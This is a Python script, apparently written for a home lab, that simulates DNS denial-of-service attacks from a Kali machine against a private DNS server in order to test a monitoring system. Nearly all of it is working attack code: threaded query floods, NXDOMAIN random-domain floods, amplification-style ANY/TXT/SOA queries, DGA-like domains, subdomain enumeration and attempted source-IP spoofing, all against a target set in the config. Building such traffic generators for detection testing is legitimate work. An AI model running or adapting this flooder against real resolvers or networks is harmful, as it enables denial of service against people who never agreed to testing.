#!/usr/bin/env python3
"""
DNS Attack Simulation Script
Simulates various DNS DDoS attacks for testing the monitoring system
Run this on the attacker machine (Kali Linux)
"""

import socket
import struct
import random
import string
import time
import json
import logging
import threading
from datetime import datetime, timedelta
from typing import List, Dict, Optional
import argparse

class DNSAttackSimulator:
    def __init__(self, config_file: str = "config/attack_config.json"):
        self.logger = logging.getLogger(__name__)
        self.config = self._load_config(config_file)
        self.running = False
        self.stats = {
            'queries_sent': 0,
            'start_time': None,
            'attack_types': {}
        }
        
    def _load_config(self, config_file: str) -> Dict:
        """Load attack configuration"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            self.logger.error(f"Config file not found: {config_file}")
            return self._get_default_config()
        except Exception as e:
            self.logger.error(f"Error loading config: {e}")
            return self._get_default_config()
            
    def _get_default_config(self) -> Dict:
        """Get default configuration"""
        return {
            "target_ip": "192.168.85.130",
            "target_port": 53,
            "query_per_minute": 1000,
            "spoofed_ip_range": {"start": 100, "end": 200},
            "attack_types": {
                "dns_flood": {"enabled": True},
                "nxdomain_attack": {"enabled": True},
                "amplification_attack": {"enabled": True},
                "dga_domains": {"enabled": True}
            },
            "timing": {
                "burst_mode": False,
                "delay_between_queries": 0.01,
                "duration_seconds": 300
            }
        }
        
    def _create_dns_query(self, domain: str, query_type: int = 1, 
                         transaction_id: Optional[int] = None) -> bytes:
        """Create a DNS query packet"""
        if transaction_id is None:
            transaction_id = random.randint(1, 65535)
            
        # DNS Header (12 bytes)
        flags = 0x0100  # Standard query with recursion desired
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        header = struct.pack('!HHHHHH', transaction_id, flags, questions, 
                           answers, authority, additional)
        
        # DNS Question
        question = b''
        
        # Encode domain name
        for part in domain.split('.'):
            question += struct.pack('B', len(part)) + part.encode('ascii')
        question += b'\x00'  # End of domain name
        
        # Query type and class
        question += struct.pack('!HH', query_type, 1)  # Type A, Class IN
        
        return header + question
        
    def _generate_random_domain(self, length: int = 10) -> str:
        """Generate a random domain name (DGA-like)"""
        # Generate random string with low vowel ratio (typical DGA characteristic)
        consonants = 'bcdfghjklmnpqrstvwxyz'
        vowels = 'aeiou'
        
        domain = ''
        for i in range(length):
            if i % 4 == 0 and random.random() < 0.3:  # Low vowel probability
                domain += random.choice(vowels)
            else:
                domain += random.choice(consonants)
                
        # Add TLD
        tlds = ['com', 'net', 'org', 'info', 'biz']
        return f"{domain}.{random.choice(tlds)}"
        
    def _generate_spoofed_ip(self) -> str:
        """Generate a spoofed source IP"""
        base_ip = "192.168.85"
        start = self.config['spoofed_ip_range']['start']
        end = self.config['spoofed_ip_range']['end']
        host = random.randint(start, end)
        return f"{base_ip}.{host}"
        
    def _send_dns_query(self, domain: str, query_type: int = 1, 
                       source_ip: Optional[str] = None) -> bool:
        """Send a single DNS query"""
        try:
            # Create DNS query
            dns_query = self._create_dns_query(domain, query_type)
            
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Set source IP if spoofing (requires root privileges)
            if source_ip:
                try:
                    sock.bind((source_ip, 0))
                except OSError:
                    # IP spoofing failed, continue with real IP
                    pass
                    
            # Send query
            target = (self.config['target_ip'], self.config['target_port'])
            sock.sendto(dns_query, target)
            sock.close()
            
            self.stats['queries_sent'] += 1
            return True
            
        except Exception as e:
            self.logger.debug(f"Failed to send query for {domain}: {e}")
            return False
            
    def dns_flood_attack(self, duration: int = 60) -> None:
        """Simulate DNS query flood attack"""
        self.logger.info("Starting DNS flood attack")
        attack_start = time.time()
        
        domains = [
            "google.com", "facebook.com", "youtube.com", "amazon.com",
            "wikipedia.org", "twitter.com", "instagram.com", "linkedin.com",
            "netflix.com", "reddit.com", "ebay.com", "cnn.com"
        ]
        
        query_types = [1, 28, 15, 2]  # A, AAAA, MX, NS
        
        while self.running and (time.time() - attack_start) < duration:
            domain = random.choice(domains)
            query_type = random.choice(query_types)
            source_ip = self._generate_spoofed_ip()
            
            self._send_dns_query(domain, query_type, source_ip)
            
            if not self.config['timing']['burst_mode']:
                time.sleep(self.config['timing']['delay_between_queries'])
                
        self.stats['attack_types']['dns_flood'] = self.stats['queries_sent']
        
    def nxdomain_attack(self, duration: int = 60) -> None:
        """Simulate NXDOMAIN attack with random domains"""
        self.logger.info("Starting NXDOMAIN attack")
        attack_start = time.time()
        
        while self.running and (time.time() - attack_start) < duration:
            # Generate random non-existent domain
            random_domain = self._generate_random_domain(
                random.randint(8, 15)
            )
            source_ip = self._generate_spoofed_ip()
            
            self._send_dns_query(random_domain, 1, source_ip)
            
            if not self.config['timing']['burst_mode']:
                time.sleep(self.config['timing']['delay_between_queries'])
                
        self.stats['attack_types']['nxdomain_attack'] = self.stats['queries_sent']
        
    def amplification_attack(self, duration: int = 60) -> None:
        """Simulate DNS amplification attack"""
        self.logger.info("Starting DNS amplification attack")
        attack_start = time.time()
        
        # Domains known to have large DNS responses
        amplification_domains = [
            "google.com", "cloudflare.com", "akamai.com", "amazon.com",
            "microsoft.com", "apple.com", "facebook.com"
        ]
        
        # Query types that typically return large responses
        amplification_types = [255, 16, 6]  # ANY, TXT, SOA
        
        while self.running and (time.time() - attack_start) < duration:
            domain = random.choice(amplification_domains)
            query_type = random.choice(amplification_types)
            source_ip = self._generate_spoofed_ip()
            
            self._send_dns_query(domain, query_type, source_ip)
            
            if not self.config['timing']['burst_mode']:
                time.sleep(self.config['timing']['delay_between_queries'])
                
        self.stats['attack_types']['amplification_attack'] = self.stats['queries_sent']
        
    def dga_domain_attack(self, duration: int = 60) -> None:
        """Simulate DGA (Domain Generation Algorithm) attack"""
        self.logger.info("Starting DGA domain attack")
        attack_start = time.time()
        
        # Generate DGA-like domains with various algorithms
        algorithms = ['random', 'date_based', 'dictionary']
        
        while self.running and (time.time() - attack_start) < duration:
            algorithm = random.choice(algorithms)
            
            if algorithm == 'random':
                domain = self._generate_random_domain(random.randint(6, 20))
            elif algorithm == 'date_based':
                # Generate domain based on current date
                today = datetime.now()
                seed = f"{today.year}{today.month:02d}{today.day:02d}"
                random.seed(seed)
                domain = self._generate_random_domain(12) 
                random.seed()  # Reset seed
            else:  # dictionary
                # Mix dictionary words with random characters
                words = ['secure', 'update', 'service', 'system', 'network']
                word = random.choice(words)
                suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                domain = f"{word}{suffix}.com"
                
            source_ip = self._generate_spoofed_ip()
            self._send_dns_query(domain, 1, source_ip)
            
            if not self.config['timing']['burst_mode']:
                time.sleep(self.config['timing']['delay_between_queries'])
                
        self.stats['attack_types']['dga_domains'] = self.stats['queries_sent']
        
    def subdomain_enumeration_attack(self, duration: int = 60) -> None:
        """Simulate subdomain enumeration attack"""
        self.logger.info("Starting subdomain enumeration attack")
        attack_start = time.time()
        
        target_domains = ["example.com", "test.com", "demo.org"]
        common_subdomains = [
            "www", "mail", "ftp", "admin", "test", "dev", "staging", "api",
            "blog", "shop", "support", "help", "docs", "cdn", "assets",
            "images", "static", "media", "upload", "download", "secure",
            "vpn", "remote", "backup", "monitoring", "status", "health"
        ]
        
        while self.running and (time.time() - attack_start) < duration:
            base_domain = random.choice(target_domains)
            subdomain = random.choice(common_subdomains)
            
            # Add some random subdomains too
            if random.random() < 0.3:
                subdomain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
                
            full_domain = f"{subdomain}.{base_domain}"
            source_ip = self._generate_spoofed_ip()
            
            self._send_dns_query(full_domain, 1, source_ip)
            
            if not self.config['timing']['burst_mode']:
                time.sleep(self.config['timing']['delay_between_queries'])
                
        self.stats['attack_types']['subdomain_enumeration'] = self.stats['queries_sent']
        
    def run_mixed_attack(self, duration: int = 300) -> None:
        """Run multiple attack types simultaneously"""
        self.logger.info(f"Starting mixed DNS attack for {duration} seconds")
        self.running = True
        self.stats['start_time'] = datetime.now()
        
        # Create threads for different attack types
        threads = []
        
        if self.config['attack_types']['dns_flood']['enabled']:
            t = threading.Thread(target=self.dns_flood_attack, args=(duration,))
            threads.append(t)
            
        if self.config['attack_types']['nxdomain_attack']['enabled']:
            t = threading.Thread(target=self.nxdomain_attack, args=(duration,))
            threads.append(t)
            
        if self.config['attack_types']['amplification_attack']['enabled']:
            t = threading.Thread(target=self.amplification_attack, args=(duration,))
            threads.append(t)
            
        if self.config['attack_types']['dga_domains']['enabled']:
            t = threading.Thread(target=self.dga_domain_attack, args=(duration,))
            threads.append(t)
            
        # Add subdomain enumeration
        t = threading.Thread(target=self.subdomain_enumeration_attack, args=(duration,))
        threads.append(t)
        
        # Start all threads
        for thread in threads:
            thread.start()
            
        # Wait for completion or stop signal
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            self.logger.info("Attack interrupted by user")
            self.running = False
            
        self._print_stats()
        
    def _print_stats(self) -> None:
        """Print attack statistics"""
        if self.stats['start_time']:
            duration = datetime.now() - self.stats['start_time']
            qps = self.stats['queries_sent'] / duration.total_seconds()
            
            print(f"\n=== Attack Statistics ===")
            print(f"Duration: {duration.total_seconds():.1f} seconds")
            print(f"Total queries sent: {self.stats['queries_sent']:,}")
            print(f"Average QPS: {qps:.1f}")
            print(f"Target: {self.config['target_ip']}:{self.config['target_port']}")
            
            if self.stats['attack_types']:
                print(f"\nQueries by attack type:")
                for attack_type, count in self.stats['attack_types'].items():
                    print(f"  {attack_type}: {count:,}")
                    
    def stop_attack(self) -> None:
        """Stop the attack"""
        self.running = False
        
def main():
    parser = argparse.ArgumentParser(description='DNS Attack Simulator')
    parser.add_argument('--config', '-c', default='config/attack_config.json',
                       help='Configuration file path')
    parser.add_argument('--duration', '-d', type=int, default=300,
                       help='Attack duration in seconds')
    parser.add_argument('--attack-type', '-t', 
                       choices=['flood', 'nxdomain', 'amplification', 'dga', 'mixed'],
                       default='mixed', help='Type of attack to simulate')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Create simulator
    simulator = DNSAttackSimulator(args.config)
    
    try:
        if args.attack_type == 'flood':
            simulator.running = True
            simulator.stats['start_time'] = datetime.now()
            simulator.dns_flood_attack(args.duration)
        elif args.attack_type == 'nxdomain':
            simulator.running = True
            simulator.stats['start_time'] = datetime.now()
            simulator.nxdomain_attack(args.duration)
        elif args.attack_type == 'amplification':
            simulator.running = True
            simulator.stats['start_time'] = datetime.now()
            simulator.amplification_attack(args.duration)
        elif args.attack_type == 'dga':
            simulator.running = True
            simulator.stats['start_time'] = datetime.now()
            simulator.dga_domain_attack(args.duration)
        else:  # mixed
            simulator.run_mixed_attack(args.duration)
            
        simulator._print_stats()
        
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
        simulator.stop_attack()
        simulator._print_stats()
    except Exception as e:
        print(f"Error during attack simulation: {e}")
        
if __name__ == "__main__":
    main()